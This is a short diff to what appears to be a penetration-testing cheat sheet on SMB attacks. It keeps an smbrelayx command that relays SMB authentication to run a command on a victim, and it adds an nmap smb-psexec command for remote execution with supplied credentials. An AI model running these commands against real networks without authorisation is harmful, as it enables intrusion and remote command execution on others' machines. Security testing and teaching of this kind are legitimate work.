@@ -259,3 +259,8 @@ Fire up SMBRelayx tool that will listen for incoming SMB authentication requests
 ```
 smbrelayx.py -h <Victim IP> -c "ipconfig"
 ```
+## PSexec with NMAP:
+
+```
+nmap --script smb-psexec.nse -script-args=smbuser=<username>, smbpass=<password>[,config=<config>] -p445 <hosts>
+```
